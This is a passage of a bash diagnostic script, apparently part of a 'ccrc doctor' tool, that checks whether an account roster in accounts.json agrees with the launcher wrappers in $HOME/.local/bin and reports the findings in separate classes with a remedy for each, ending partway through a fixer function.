# D-82: the first two are ABSENT — nothing `ccrc wrappers` would refuse to
# write, because it never sees a file there at all (its `absent` decision-table
# arm writes; a dangling symlink is replaced by its `mv -f`) — and go to the
# CALLER-NAMED bucket, a nameref, so the caller decides which class they are.
# The last one is a file that exists and is WRONG, which `ccrc wrappers` would
# refuse to touch (D-82's point: a file on disk that disagrees is a different
# operator action than a file that was never written), so it stays hard-wired
# to `wr_hard` regardless of what the caller passed — the asymmetry is
# deliberate, not an oversight to "fix" into three namerefs.
#
# Returns 1 when it found something to say, so a caller can stop there rather
# than go on to ask a question about a file that is not there.
_dr_wr_present() {   # id bucketname — presence probe; absent-class findings go to the NAMED bucket
  local id="$1"
  local -n _wrp_bucket="$2"
  local p="$WRAPPER_BIN_DIR/$id"
  if [ -L "$p" ] && [ ! -e "$p" ]; then
    _wrp_bucket+=("$id's \$HOME/.local/bin/$id is a symlink to a path that does not exist")
    return 1
  fi
  if [ ! -e "$p" ]; then
    _wrp_bucket+=("$id has no executable at \$HOME/.local/bin/$id")
    return 1
  fi
  # present-but-wrong stays DISAGREEMENT class regardless of caller: a file
  # ccrc wrappers would refuse is not fixed by running ccrc wrappers.
  #
  # `-f` BEFORE `-x`, and it is not redundant: a DIRECTORY is both `-e` and
  # `-x` (that is what the execute bit means on a directory), so without this a
  # `mkdir $HOME/.local/bin/<id>` passed the whole triad and doctor reported
  # `PASS wrappers: N accounts … match`. Found by the round-2 review, and it is
  # a narrowing THIS ROUND INTRODUCED: before external/upstream were routed
  # through here, a directory fell into the a-only arm and was caught by
  # `_wrap_is_script`'s own `-f`.
  if [ ! -f "$p" ]; then
    wr_hard+=("$id's \$HOME/.local/bin/$id is not a regular file")
    return 1
  fi
  if [ ! -x "$p" ]; then
    wr_hard+=("$id's \$HOME/.local/bin/$id is not executable")
    return 1
  fi
  return 0
}

# `_wrap_set_diff`'s callback. It appends to `wr_hard`/`wr_soft`, which are
# `_check_wrappers`'s locals — bash's dynamic scope makes them visible here,
# which is what lets the set difference stay generic while its two callers say
# entirely different things about the same arithmetic.
#
# The a-only branch MEASURES before it words its finding: "the roster expects a
# wrapper here and there is no CLAUDE_CONFIG_DIR-setting script of that name"
# is five distinguishable states on disk (nothing, a dangling symlink, a
# directory or other non-file, a file that is not executable, a file that is
# not a wrapper — and that last one splits again into "not a script at all" and
# "a script that sets no CLAUDE_CONFIG_DIR"), and an operator does something
# different about each. Collapsing any two into one message is the
# overloaded-seam mistake this codebase bans by name.
#
# EVERY ONE OF THEM HAS ITS OWN TEST, and that sentence was not true until the
# round-2 review measured it: the presence triad was pinned but the two SHAPE
# sentences below were not, so replacing this whole inner `if/else` with `:`
# left the suite 95/95 green while a real defect went unreported. They now have
# a test each, plus a third that puts both defects in ONE run and asserts the
# two sentences stay distinct — the merge into a single "is not a wrapper" is
# precisely the collapse this comment claims to forbid, and a comment is a
# request where a red suite is a mechanism.
_dr_wr_note() {
  local dir="$1" id="$2"
  # TWO `local` statements, and it must stay that way: bash expands every
  # word of a single `local a=… b="$a"` BEFORE any of the names becomes local,
  # so `p` would be built from the CALLER's `id` — which `_check_wrappers` has,
  # left over from its own loops. Measured: `local id="$2" p="pre/$id"` with an
  # outer id set prints `p=pre/<outer>`. That is a silent wrong answer (the
  # finding names the right account and describes a different file), which is
  # why the pinning test below uses an account that is not the last one in the
  # roster.
  local p="$WRAPPER_BIN_DIR/$id"
  case "$dir" in
    a-only)
      # This is the ccrc-owned-wrapper path (`wr_expect` is built from
      # `generated` and `codex` ids only, above): absent and a dangling symlink
      # are exactly what `ccrc wrappers` writes — its `absent` decision-table
      # arm writes, and `mv -f` over a dangling symlink replaces it — so those
      # findings go to `wr_absent`, not `wr_hard`.
      if _dr_wr_present "$id" wr_absent; then
        if ! _wrap_is_script "$p"; then
          wr_hard+=("$id is declared ${wr_kind[$id]} but \$HOME/.local/bin/$id is not a script")
        else
          wr_hard+=("$id is declared ${wr_kind[$id]} but \$HOME/.local/bin/$id sets no CLAUDE_CONFIG_DIR")
        fi
      fi
      ;;
    b-only)
      case "${wr_kind[$id]:-}" in
        upstream)
          # The upstream account is BY DEFINITION invoked with
          # CLAUDE_CONFIG_DIR unset (ccrc-adopt's header) — a wrapper here
          # means every other account's exec lands in someone else's config dir.
          wr_hard+=("$id is the roster's upstream account, but \$HOME/.local/bin/$id is a script that sets CLAUDE_CONFIG_DIR") ;;
        "")
          wr_soft+=("$id sets CLAUDE_CONFIG_DIR in \$HOME/.local/bin but no roster account describes it") ;;
      esac
      ;;
  esac
}

_check_wrappers() {
  # A server-role box hosts no sessions (D-3111): the installer converges
  # nothing per account there, so this check measures nothing there either —
  # the same sentence `_check_skills` has said since it shipped. `-f` before
  # `-r` (D-3025).
  local _srv_role=""
  # `${BOX_ENV_FILE:-}`: this file is sourced under `set -u` by callers that
  # are not `ccrc` (a test sources it bare and calls one check), so a bare
  # `$BOX_ENV_FILE` here is an unbound-variable death, not a skipped gate.
  [ -f "${BOX_ENV_FILE:-}" ] && [ -r "${BOX_ENV_FILE:-}" ] && _srv_role="$(_box_env_value "$BOX_ENV_FILE" CCRC_ROLE)"
  if [ "$_srv_role" = server ]; then
    _dr_skip wrappers "this box records CCRC_ROLE=server, so it hosts no sessions and no launcher on it is ccrc's concern (its roster was validated when accounts.sh was generated)"
    return 3
  fi
  # THE LIBRARY IS A SEPARATE INSTALL ARTIFACT. `ccrc` finds its siblings
  # through `${BASH_SOURCE[0]}`, which bash does not resolve through a symlink,
  # so a link to `ccrc` on PATH does not rescue a missing one: all three files
  # have to land in the same directory. Said as a verdict rather than a comment
  # because an install that ships two of the three is otherwise a check that
  # silently stops checking.
  if ! declare -F _wrap_parse_shape >/dev/null 2>&1; then
    _dr_fail wrappers "the wrapper-shape library did not load, so the roster and \$HOME/.local/bin were never compared — expected it at $CCRC_WRAPPER_LIB" \
      "install ccrc-wrapper-shape into the same directory as ccrc and ccrc-doctor-checks (all three resolve each other through \${BASH_SOURCE[0]}, and bash does not follow that through a symlink)"
    return 1
  fi
  # D-155: the same question asked of a VALUE, not only of a function, because
  # "the library loaded" and "the library is the one this file was written
  # against" are two different facts and the second one is the one that bites.
  # A `ccrc-wrapper-shape` predating `WRAPPER_OVERSIZE_BYTES` defines
  # `_wrap_parse_shape` perfectly well, so the guard above passes — and then the
  # size gate further down dereferences an unset variable under this file's
  # `set -u` and takes the WHOLE doctor run down, every other check with it,
  # rather than failing one verdict line. A mixed install is transient but real:
  # the three files land through separate `install_atomic` calls.
  #
  # `:-` would be the cheap answer and it is the wrong one: it would put a
  # second spelling of D-81's threshold back into this file, which is the exact
  # duplication moving the constant into the library removed.
  if [ -z "${WRAPPER_OVERSIZE_BYTES:-}" ]; then
    _dr_fail wrappers "the wrapper-shape library at $CCRC_WRAPPER_LIB loaded but is older than this ccrc — it declares no WRAPPER_OVERSIZE_BYTES, so the roster and \$HOME/.local/bin were not compared" \
      "the three files ship together and must be the same build: re-run the install (or redeploy) so ccrc, ccrc-doctor-checks and ccrc-wrapper-shape all come from one tree"
    return 1
  fi

  local bin="$WRAPPER_BIN_DIR" roster="$HOME/.ccrc/accounts.json"
  # D-82: `wr_absent` is its own bucket, not a third name for `wr_hard` — see
  # `_dr_wr_present`'s own header for the class it holds and why.
  #
  # A2-NEW (this task): `wr_upstream` is a FOURTH bucket, not a second name for
  # `wr_absent` — see the `upstream)` case arm below for why an absent upstream
  # binary is not the same operator instruction as an absent ccrc-owned wrapper.
  local -a wr_hard=() wr_soft=() wr_absent=() wr_upstream=()

  if [ ! -e "$roster" ]; then
    _dr_fail wrappers "no account roster at \$HOME/.ccrc/accounts.json, so nothing on this box says what \$HOME/.local/bin is supposed to hold" \
      "bootstrap one from what is already on disk: ccrc adopt --out /tmp/accounts.json, read it, then move it to \$HOME/.ccrc/accounts.json"
    return 1
  fi
  if [ ! -f "$roster" ]; then
    _dr_fail wrappers "\$HOME/.ccrc/accounts.json is not a regular file, so the roster cannot be read" \
      "look at what is there — check with: ls -ld \$HOME/.ccrc/accounts.json"
    return 1
  fi
  if ! command -v node >/dev/null 2>&1; then
    # Read by node rather than jq for the reason `_check_node` gives at its own
    # parse: this check must not fail for a reason that belongs to another one.
    # A box with no jq gets exactly one FAIL, from the jq check.
    _dr_fail wrappers "node is not on PATH, so \$HOME/.ccrc/accounts.json cannot be read" \
      "install Node first — see the 'node' check above"
    return 1
  fi

  # READING the file and PARSING it are separated for the same reason
  # `_check_node` separates them: a mode/ownership problem and a corrupt file
  # are two conditions an operator acts on completely differently.
  #   exit 5 = cannot be read (prints "READERR:<code>")
  #   exit 3 = does not parse; exit 4 = no accounts array; exit 6 = it is empty.
  local tsv rc
  tsv="$(CCRC_DOCTOR_ROSTER="$roster" node -e '
    const fs = require("fs");
    let text;
    try { text = fs.readFileSync(process.env.CCRC_DOCTOR_ROSTER, "utf8"); }
    catch (e) { process.stdout.write("READERR:" + (e && e.code ? e.code : "unknown")); process.exit(5); }
    let j;
    try { j = JSON.parse(text); } catch (e) { process.exit(3); }
    if (!j || typeof j !== "object" || !Array.isArray(j.accounts)) process.exit(4);
    if (j.accounts.length === 0) process.exit(6);
    // EVERY CONTROL BYTE IS ESCAPED — all of C0 (0x00-0x1f) and DEL (0x7f) —
    // not just the three that would break this TSV (Task 5 review, Minor 5;
    // widened by the round-2 review, which pointed out that the narrow version
    // left the very failure it was closing reachable through a different
    // byte). Two separate jobs, and both are load-bearing:
    //   - TSV integrity: a tab or a newline inside a value would silently
    //     become a field or a record boundary.
    //   - THE VERDICT LINE IS READ BY A HUMAN, on a terminal that ACTS on
    //     control bytes. `"claude\bcorp"` renders as `claude-corp` if the
    //     terminal is allowed to see the backspace, so an id that is not an
    //     account can be made to look exactly like one that is. The reader
    //     used to squash the three it knew about down to a space, which
    //     INVENTED a plausible id (`acct b`) all by itself.
    // The backslash escape is the half that makes this INJECTIVE: without it,
    // an id spelled with a literal backslash-t and an id carrying a real tab
    // arrive as the same string, and an escaped rendering that can be forged
    // is no better than the raw byte. Nothing escaped this way can match
    // WRAPPER_ID_RE, so the reader below refuses such an id by name rather
    // than looking on disk for it.
    const esc = (c) => "\\x" + c.charCodeAt(0).toString(16).padStart(2, "0");
    const s = (v) => (typeof v === "string"
      ? v.replace(/\\/g, "\\\\").replace(/\t/g, "\\t").replace(/\r/g, "\\r")
         .replace(/\n/g, "\\n").replace(/[\x00-\x1f\x7f]/g, esc)
      : "");
    process.stdout.write(j.accounts.map((a) => {
      const o = (a && typeof a === "object") ? a : {};
      const e = (o.exec && typeof o.exec === "object") ? o.exec : {};
      return [s(o.id), s(o.configDirSuffix), s(e.kind), s(e.secretsFile)].join("\t");
    }).join("\n"));
  ' 2>/dev/null)"; rc=$?

  if [ "$rc" -eq 5 ]; then
    local why="${tsv#READERR:}"
    [ -n "$why" ] && [ "$why" != "$tsv" ] || why="unreadable"
    _dr_fail wrappers "\$HOME/.ccrc/accounts.json exists but cannot be read ($why), so the roster cannot be compared with anything" \
      "fix its mode/ownership — check with: ls -l \$HOME/.ccrc/accounts.json"
    return 1
  fi
  if [ "$rc" -eq 3 ]; then
    _dr_fail wrappers "\$HOME/.ccrc/accounts.json does not parse as JSON, so this box's roster cannot be read" \
      "restore it from a backup, or rebuild it from disk: ccrc adopt --out /tmp/accounts.json"
    return 1
  fi
  if [ "$rc" -eq 4 ]; then
    _dr_fail wrappers "\$HOME/.ccrc/accounts.json parses but declares no accounts array" \
      "it must be {\"version\":1,\"accounts\":[…]} — rebuild it from disk: ccrc adopt --out /tmp/accounts.json"
    return 1
  fi
  if [ "$rc" -eq 6 ]; then
    # A scan over an empty list passes everything, and a doctor that reports a
    # healthy box by measuring nothing is the worst failure this verb has.
    _dr_fail wrappers "\$HOME/.ccrc/accounts.json declares zero accounts — refusing to report agreement nobody measured" \
      "rebuild it from disk: ccrc adopt --out /tmp/accounts.json"
    return 1
  fi
  if [ "$rc" -ne 0 ]; then
    _dr_fail wrappers "reading \$HOME/.ccrc/accounts.json exited $rc — this check does not know what that means" \
      "this is a bug in ccrc, not a fact about your box — see _check_wrappers in $CCRC_HERE/ccrc-doctor-checks"
    return 1
  fi

  # ── the roster side ────────────────────────────────────────────────────
  # THE FOUR FIELDS ARE SPLIT BY HAND (D-71), and `IFS=$'\t' read -r id suffix
  # kind secrets` — which is what this was — must not come back. A tab is IFS
  # *whitespace*, so bash collapses a run of them into one delimiter and strips
  # leading ones: an entry with no `id` arrived as `<TAB>.acct-a<TAB>generated`
  # and was read as id=".acct-a", suffix="generated", which is how a roster
  # entry with no id at all got reported as an account named after its own
  # config dir. Measured on both of the entries that expose it (no id, no
  # configDirSuffix); each has its own test below. Parameter expansion has no
  # such rule — an empty field stays an empty field, and its position holds.
  local -A wr_kind=() wr_suffix=() wr_secrets=()
  local -a wr_ids=()
  local id suffix kind secrets _wr_rest _wr_line _wr_i
  local -a _wr_f=()
  local n_up=0 n_gen=0 n_ext=0 n_codex=0 upstream_id=""
  while IFS= read -r _wr_line; do
    _wr_f=(); _wr_rest="$_wr_line"
    for _wr_i in 1 2 3; do
      _wr_f+=("${_wr_rest%%$'\t'*}")
      if [[ "$_wr_rest" == *$'\t'* ]]; then _wr_rest="${_wr_rest#*$'\t'}"; else _wr_rest=""; fi
    done
    _wr_f+=("$_wr_rest")
    id="${_wr_f[0]}" suffix="${_wr_f[1]}" kind="${_wr_f[2]}" secrets="${_wr_f[3]}"
    if [ -z "$id" ]; then
      wr_hard+=("the roster holds an account with no id")
      continue
    fi
    # An id is not decoration: it is the FILENAME ccd executes
    # ($HOME/.local/bin/<id>, ccd:9057), so the roster's ids are held to the
    # same rule as the disk's, `WRAPPER_ID_RE` — the one `shared/roster.ts`
    # states. Nothing else in this check can be trusted about an entry whose id
    # is not an id, so it is reported and skipped rather than looked up on disk
    # under a name no file could have. (Task 5 review, Minor 5: the reader used
    # to make an illegal id LOOK legal — `"acct<TAB>b"` arrived as `acct b` and
    # was reported as "acct b has no executable at …", a plausible sentence
    # about an account that does not exist.)
    if [[ ! "$id" =~ $WRAPPER_ID_RE ]]; then
      wr_hard+=("the roster holds an account whose id \"$id\" is not a legal account id (${WRAPPER_ID_RE}), so no file could be named after it")
      continue
    fi
    if [[ -v wr_kind[$id] ]]; then
      wr_hard+=("$id is declared twice in the roster")
      continue
    fi
    wr_ids+=("$id"); wr_kind["$id"]="$kind"; wr_suffix["$id"]="$suffix"; wr_secrets["$id"]="$secrets"
    case "$kind" in
      upstream)  n_up=$((n_up + 1)); [ -n "$upstream_id" ] || upstream_id="$id" ;;
      generated) n_gen=$((n_gen + 1)) ;;
      external)  n_ext=$((n_ext + 1)) ;;
      codex)     n_codex=$((n_codex + 1)) ;;
    esac
  done <<< "$tsv"

  if [ ! -d "$bin" ]; then
    _dr_fail wrappers "no \$HOME/.local/bin at all, so the roster's ${#wr_ids[@]} accounts have nowhere to live" \
      "run: ccrc wrappers — it creates \$HOME/.local/bin and writes every generated and Codex account's wrapper (an upstream or external account still needs installing by hand)"
    return 1
  fi

  # ── the disk side ──────────────────────────────────────────────────────
  # `ccrc-adopt`'s own candidate rule, run through the same functions: an
  # id-shaped executable that is a script and sets CLAUDE_CONFIG_DIR. Anything
  # looser would report every tool in ~/.local/bin as an undeclared account;
  # anything narrower would miss the account somebody added and never wrote
  # down. The upstream account is deliberately NOT in this set — it is a binary,
  # not a wrapper, and it is checked on its own below.
  local -a wr_cands=()
  local f name had_nullglob=0
  shopt -q nullglob && had_nullglob=1
  shopt -s nullglob
  for f in "$bin"/*; do
    [ -f "$f" ] || continue
    [ -x "$f" ] || continue
    name="${f##*/}"
    [[ "$name" =~ $WRAPPER_ID_RE ]] || continue
    _wrap_is_script "$f" || continue
    _wrap_declares_config_dir "$f" || continue
    wr_cands+=("$name")
  done
  [ "$had_nullglob" -eq 1 ] || shopt -u nullglob

  # Drop a candidate that IS a declared account's wrapper under a second name.
  # The measured case is `gpt -> ccgpt`, both in ~/.local/bin, one file: adopt
  # drops the alias too (its pass 0.5) or it would propose two accounts fighting
  # over one CLAUDE_CONFIG_DIR. `-ef` is a bash builtin comparing device+inode
  # THROUGH the symlink, so this needs no `readlink` — and it catches a hard
  # link, which `readlink` would not.
  local -a wr_seen=()
  local other alias_of
  for name in ${wr_cands[@]+"${wr_cands[@]}"}; do
    if [[ -v wr_kind[$name] ]]; then wr_seen+=("$name"); continue; fi
    alias_of=""
    for other in ${wr_ids[@]+"${wr_ids[@]}"}; do
      [ -e "$bin/$other" ] || continue
      if [ "$bin/$name" -ef "$bin/$other" ]; then alias_of="$other"; break; fi
    done
    [ -n "$alias_of" ] || wr_seen+=("$name")
  done

  # ── both directions, reported ──────────────────────────────────────────
  # The roster ids that MUST be a CLAUDE_CONFIG_DIR-setting script on disk:
  # `generated` and `codex` — ccrc's own shape, the one thing here that is
  # written against a contract this repository states.
  #
  # `upstream` is excluded because a 300 MB ELF is its normal shape, and
  # `external` because its shape is nobody's business: it may be compiled, and
  # it may spell its config dir in a way no `export` line matches (Task 5
  # review, Important 3 — as written, `wr_seen` membership demanded both
  # `_wrap_is_script` AND a literal `export CLAUDE_CONFIG_DIR=` line, so a
  # perfectly good external launcher landed in the a-only side of this
  # difference and FAILED the box). Both kinds are still checked for the one
  # thing ccd needs — an executable of that name — in the loop below.
  local -a wr_expect=()
  for id in ${wr_ids[@]+"${wr_ids[@]}"}; do
    case "${wr_kind[$id]}" in generated|codex) wr_expect+=("$id") ;; esac
  done
  _wrap_set_diff _dr_wr_note wr_expect wr_seen

  # ── shape, for the accounts ccrc claims to own ─────────────────────────
  local ok target wsuffix wsecrets
  for id in ${wr_ids[@]+"${wr_ids[@]}"}; do
    case "${wr_kind[$id]}" in
      upstream)
        # RECORDED, NEVER READ, same as `external` below: the only question
        # asked is whether there is an executable at the path ccd will run.
        # The upstream account's normal shape is a binary (a ~300 MB ELF), so
        # nothing more than existence would be inventing a contract nobody
        # made.
        #
        # `wr_upstream`, NOT `wr_hard` and NOT `wr_absent` (A2-NEW): an absent
        # upstream binary is a fresh box that has never had Claude Code
        # installed on it at all — `ccrc wrappers` never writes this account
        # either way (D-71: ccrc-owned launchers only), so it is absent-class
        # same as `wr_absent`'s reasoning, but the ROSTER-SYNC remedy
        # ("make \$HOME/.ccrc/accounts.json and the wrapper agree") is
        # actively wrong for it — there is no wrapper to write or roster
        # entry to fix, only a binary to install, and `ccrc wrappers` would
        # not create it even if run. A fresh VM's `ccrc doctor` used to hand
        # the operator that sentence and the operator had nothing to do with
        # it: the roster already says "upstream", correctly. It is its own
        # bucket, not a fourth caller of `wr_absent`, so its FAIL line can
        # carry a remedy that names the one thing actually missing —
        # `install Claude Code`, below in the verdict assembly — rather than
        # inheriting `wr_absent`'s "run: ccrc wrappers", which does not
        # install anything either.
        #
        # Present-but-wrong (not a regular file, not executable) still lands
        # in `wr_hard` regardless — `_dr_wr_present` hard-wires that arm to
        # `wr_hard` no matter which bucket the caller names, so that class
        # needed no change here.
        _dr_wr_present "$id" wr_upstream || true
        ;;
      external)
        # Somebody else's launcher, possibly compiled, spelling its config dir
        # any way it likes — its content is not this tool's business, so the
        # only question asked is the same existence probe `upstream` gets.
        # Unlike `upstream`, there is nothing to tell an operator to INSTALL:
        # ccrc did not write this account and does not know what a bespoke
        # external launcher even is, so `wr_hard`'s roster-sync remedy stays
        # correct here — "the roster is the source of truth" is the honest
        # instruction for an account this tool never generates and never
        # installs on anyone's behalf, absent or present-but-wrong alike.
        _dr_wr_present "$id" wr_hard || true
        ;;
      generated|codex)
        # Absent from disk, or not a wrapper at all: already reported, in the
        # words the measurement earned, by the set difference above.
        _dr_wr_has "$id" ${wr_seen[@]+"${wr_seen[@]}"} || continue
        # D-71 SAYS THIS IDIOM IS BANNED FOR RECORDS WITH POSSIBLY-EMPTY
        # FIELDS, and this one is the exception — for a reason that lives in
        # ANOTHER FILE, which is why it is written down here:
        # `_wrap_parse_shape` (ccd/ccrc-wrapper-shape) only prints `ok` after
        # matching `target` against WRAPPER_ID_RE and `suffix` against
        # WRAPPER_SUFFIX_SAFE_RE, both of which reject the empty string, and
        # `ok` is a literal. So the ONLY field that can be empty is `secrets`,
        # the LAST one — and a trailing empty field is the one case
        # `IFS=$'\t' read` handles correctly. Its `no` answer is four empty
        # fields, but the `[ "$ok" != ok ]` line below is the only thing read
        # in that case.
        # RE-CHECK THIS IF EITHER REGEX IS RELAXED TO ACCEPT EMPTY, OR IF A
        # FIFTH FIELD IS ADDED AHEAD OF `secrets`: the failure would be a
        # silently WRONG D-69 verdict (a secrets path read out of the suffix
        # column), not a parse error. Split by hand then, as the roster reader
        # above does.
        #
        # D-81, THE DOCTOR SIDE: `_wrap_parse_shape` reads its candidate WHOLE
        # (`mapfile -t lines < "$f"`, `ccd/ccrc-wrapper-shape`) — unlike
        # `_wrap_is_script`'s own two-byte gate, it has no bound at all.
        # `ccrc wrappers` never hands it a genuinely oversize file post-D-81
        # (`deploy/gen-wrappers.mjs` classifies one `oversize` before bash ever
        # sees the disk path), but THIS check is a pure-bash roster-vs-disk
        # comparison with no node-side gate ahead of it, so it needs its own.
        # `stat` is guarded exactly like this file's existing `df`/`git`/`gh`
        # calls (`command -v`, never assumed) — on a box with no `stat` this
        # falls back to the old unbounded read rather than going blind, the
        # same trade this file already makes for every other external tool it
        # cannot do without. Skip-and-count, not a crash: a wrapper too big to
        # check is a disagreement (`wr_hard`), exactly like one that fails the
        # shape test outright, and the mirrored threshold is D-81's own
        # `OVERSIZE_BYTES` (`deploy/gen-wrappers.mjs`) — reached here through
        # `WRAPPER_OVERSIZE_BYTES` (D-155) rather than as a bare literal, so the
        # bash side of D-81's threshold is written once instead of once per
        # caller.
        #
        # D-87: NOT `read -N` (the pure-bash reach `_wrap_is_script` uses for
        # its own two-byte gate) — measured NOT bounded here. `read -N n`
        # counts only NON-NUL characters toward `n`, so a NUL-heavy candidate
        # (a sparse file; zero-padding in a real binary) makes it consume the
        # WHOLE file hunting for `n` non-null bytes, reintroducing exactly the
        # unboundedness this gate exists to close.
        # `-L` (D-160): FOLLOW the link. Without it `stat -c%s` answers the
        # length of the target-path STRING for a symlink — measured live on the
        # fleet box, `stat -c%s gpt` = 33 while the file behind it was 7.8 KB —
        # so a wrapper symlinked to a huge file passed this gate and was then
        # `mapfile`d whole below, reintroducing exactly the unbounded read this
        # gate exists to close, through the one shape it could not see.
        # `ccd/ccrc-adopt`'s scans have always spelled it `stat -L -c%s`; this
        # one did not, and nothing said so until a test asked.
        if command -v stat >/dev/null 2>&1; then
          local wr_sz=""
          wr_sz="$(_plat_size -L -- "$bin/$id" 2>/dev/null)" || wr_sz=""
          if [[ "$wr_sz" =~ ^[0-9]+$ ]] && [ "$wr_sz" -gt "$WRAPPER_OVERSIZE_BYTES" ]; then
            wr_hard+=("$id's \$HOME/.local/bin/$id is over 1 MiB — too big to be the generated wrapper shape, and never read")
            continue
          fi
        fi
        IFS=$'\t' read -r ok target wsuffix wsecrets < <(_wrap_parse_shape "$bin/$id")
        if [ "$ok" != ok ]; then
          wr_hard+=("$id is declared ${wr_kind[$id]} but \$HOME/.local/bin/$id is not the generated wrapper shape (a shebang, an export, an optional secrets guard, an exec — and nothing else)")
          continue
        fi
        if [ -z "${wr_suffix[$id]}" ]; then
          wr_hard+=("$id's roster entry declares no configDirSuffix, so its wrapper's $wsuffix answers to nothing")
        elif [ "$wsuffix" != "${wr_suffix[$id]}" ]; then
          wr_hard+=("$id's wrapper sets CLAUDE_CONFIG_DIR to $wsuffix but the roster declares ${wr_suffix[$id]}")
        fi
        # THE D-69 SHAPE. Three ways to disagree, and all three are the same
        # class of defect: a wrapper that loads (or fails to load) credentials
        # nobody wrote down.
        if [ -n "$wsecrets" ] && [ -z "${wr_secrets[$id]}" ]; then
          wr_hard+=("$id sources $wsecrets but the roster declares none")
        elif [ -z "$wsecrets" ] && [ -n "${wr_secrets[$id]}" ]; then
          wr_hard+=("$id sources no secrets file but the roster declares ${wr_secrets[$id]}")
        elif [ "$wsecrets" != "${wr_secrets[$id]}" ]; then
          wr_hard+=("$id sources $wsecrets but the roster declares ${wr_secrets[$id]}")
        fi
        if [ "${wr_kind[$id]}" = codex ]; then
          if [ "$target" != ccrc-codex ]; then
            wr_hard+=("$id's wrapper execs \$HOME/.local/bin/$target, not ccrc-codex — a Codex lane's launcher hands off to ccrc's own Codex launcher")
          fi
        elif [ -n "$upstream_id" ] && [ "$target" != "$upstream_id" ]; then
          wr_hard+=("$id's wrapper execs \$HOME/.local/bin/$target, not the roster's upstream account $upstream_id")
        fi
        ;;
      *)
        wr_hard+=("$id's roster entry declares no exec.kind this check understands (\"${wr_kind[$id]}\")")
        ;;
    esac
  done

  if [ "$n_gen" -gt 0 ]; then
    if [ "$n_up" -eq 0 ]; then
      wr_soft+=("the roster declares no upstream account, so no generated wrapper's exec target could be checked")
    elif [ "$n_up" -gt 1 ]; then
      wr_soft+=("the roster declares $n_up upstream accounts; every exec target was checked against the first, $upstream_id")
    fi
  fi

  # ── the verdict, one line PER CLASS OF FINDING ─────────────────────────
  # A hard finding and a soft one are two different requests to the operator,
  # each with its own remedy, so they get one line each and the check returns
  # the worse of the two (see this file's header, "ONE CHECK MAY ANSWER IN TWO
  # (OR THREE) CLASSES"). The soft findings are NOT joined onto the FAIL line:
  # that laundered "somebody keeps a launcher the fleet does not drive" into
  # "somebody broke an account", handed it the wrong remedy, and left the
  # summary counting zero warnings while warnings were on the screen.
  # D-82: `wr_absent` gets its OWN FAIL line, BEFORE `wr_hard`'s — a check may
  # answer in two classes (this file's header), and absent-vs-disagreement is
  # exactly that split: "nothing exists for `ccrc wrappers` to refuse" is not
  # the same instruction as "the roster and the wrapper disagree", and joining
  # them would either launder the absent case into a defect it is not, or hand
  # the disagreement case a remedy that fixes nothing it names.
  #
  # A2-NEW (this task): `wr_upstream` gets its OWN FAIL line too, and it goes
  # FIRST — before `wr_absent`'s, before `wr_hard`'s. Ordering is not
  # decoration here: on the box this bucket exists for (a fresh VM, roster
  # seeded, Claude Code never installed), it is very often the ONLY finding,
  # but when it is not, it is the most-actionable one — nothing else on the
  # box can be meaningfully fixed before the binary ccd execs actually exists
  # — so it leads. The FIRST sentence a fresh-VM operator reads has to be the
  # one they can act on.
  local rc=0
  if [ "${#wr_upstream[@]}" -gt 0 ]; then
    _dr_fail wrappers \
      "$(_dr_join ${wr_upstream[@]+"${wr_upstream[@]}"})" \
      "install Claude Code so its binary lands at \$HOME/.local/bin/$upstream_id — that path is literally what ccd execs, and nothing here installs it for you; then re-run 'ccrc doctor'. If it lives elsewhere, symlink it there"
    rc=1
  fi
  if [ "${#wr_absent[@]}" -gt 0 ]; then
    _dr_fail wrappers \
      "$(_dr_join ${wr_absent[@]+"${wr_absent[@]}"})" \
      "run: ccrc wrappers — nothing exists on disk for it to refuse; it creates \$HOME/.local/bin and writes every generated and Codex account's wrapper"
    rc=1
  fi
  if [ "${#wr_hard[@]}" -gt 0 ]; then
    _dr_fail wrappers \
      "$(_dr_join ${wr_hard[@]+"${wr_hard[@]}"})" \
      "the roster is the source of truth and nothing here edits it for you — make \$HOME/.ccrc/accounts.json and the wrapper agree; 'ccrc adopt --out /tmp/accounts.json' prints what a rediscovery from disk would say and writes nothing else"
    rc=1
  fi
  if [ "${#wr_soft[@]}" -gt 0 ]; then
    _dr_warn wrappers \
      "$(_dr_join ${wr_soft[@]+"${wr_soft[@]}"})" \
      "either describe it in \$HOME/.ccrc/accounts.json (adopt would call a bespoke launcher \"external\") or leave it be — ccrc never drives an account the roster does not name"
    [ "$rc" -eq 1 ] || rc=2
  fi
  if [ "$rc" -ne 0 ]; then
    return "$rc"
  fi
  _dr_pass wrappers "${#wr_ids[@]} accounts in \$HOME/.ccrc/accounts.json match \$HOME/.local/bin ($n_up upstream, $n_gen generated, $n_ext external, $n_codex Codex)"
}

# ── _fix_wrappers — the cure `ccrc doctor --fix` runs for `wrappers` ──────
# Spec §12 lets `--fix` "regenerate a marker-verified launcher" and forbids
# it to "overwrite an unverified launcher". A launcher is THIS check's
# measurement — `_check_codex` does not measure one, and a second verdict
# line for it would count one finding twice (`_check_accounts`'
# `launcher-absent` note) — so its cure rides this check, for a generated
# and a Codex account alike (D-3730,
# Plan 3a Task 8).
#
# THE CURE IS THE SHIPPED TREE'S OWN `ccrc wrappers`, WITH NO FLAG
# (`_fix_skills`' rule: re-run the shipped installer, never a copy of it).
# With no flag that verb overwrites exactly one class of file — a launcher
# carrying ccrc's marker whose hash still verifies (`ccrc-unmodified`), and
# it backs that one up first — writes where nothing is, and REFUSES every
# other file with its own remedy: a marked file edited since, a foreign
# file (equivalent or not), one it cannot read, one over 1 MiB, an id
# another launcher execs. So "never an unverified launcher" is the verb's
# own table, not a second rule here, and this fixer never passes `--force`
# or `--adopt`: those are the operator's.
#
# A CHILD PROCESS, never `cmd_wrappers` called in this shell: that verb
# `_ccrc_die`s on a manifest it will not trust and arms an EXIT trap for its
# staging directory, and cmd_doctor calls a fixer in ITS OWN shell. Its
# output is relayed line by line under this fixer's prefix, so its own
# `summary:` line can never be read as doctor's.
_fix_wrappers() {
  local ccrc="$BOX_TREE_DIR/ccd/ccrc" said rc=0 l
  if [ ! -f "$ccrc" ]; then
    echo "FIX wrappers: refused — the shipped tree has no \$HOME/ccrc/ccd/ccrc, so its 'ccrc wrappers' cannot be run; run 'ccrc update' (or 'ccrc install' from a checkout)"
    return 1
  fi
  said="$("${BASH:-bash}" "$ccrc" wrappers 2>&1)" || rc=$?
  while IFS= read -r l; do
    [ -z "$l" ] || printf 'FIX wrappers: %s\n' "$l"
  done <<< "$said"
